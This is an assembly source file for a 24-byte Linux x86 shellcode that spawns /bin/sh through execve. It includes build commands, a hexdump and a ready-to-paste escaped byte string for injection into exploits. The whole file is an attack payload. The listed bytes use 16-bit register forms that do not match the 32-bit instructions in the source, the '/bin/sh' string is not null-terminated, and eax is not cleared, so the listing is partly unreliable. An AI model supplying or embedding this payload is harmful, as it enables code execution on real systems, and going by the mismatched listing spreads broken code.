; Linux x86 shellcode - 24 bytes
;
; $ nasm localshell.asm
; $ wc -c localshell
; 24 localshell
; $ hexdump -C localshell
; 00000000  eb 0c 66 5b b0 0b 66 31  c9 66 31 d2 cd 80 e8 f1  |..f[..f1.f1.....|
; 00000010  ff 2f 62 69 6e 2f 73 68                           |./bin/sh|
; 00000018
; $ nasm -f elf localshell.asm
; $ ld -s -o localshell localshell.o
; $ ./localshell
;
; shellcode = "\xeb\x0c\x66\x5b\xb0\x0b\x66\x31\xc9\x66\x31\xd2\xcd\x80\xe8\xf1\xff\x2f\x62\x69\x6e\x2f\x73\x68";

section	.text
global	_start

_start:
	jmp short two

one:
	pop ebx
	mov al, 0x0b
	xor ecx, ecx
	xor edx, edx
	int 0x80

two:
	call one
	db "/bin/sh"
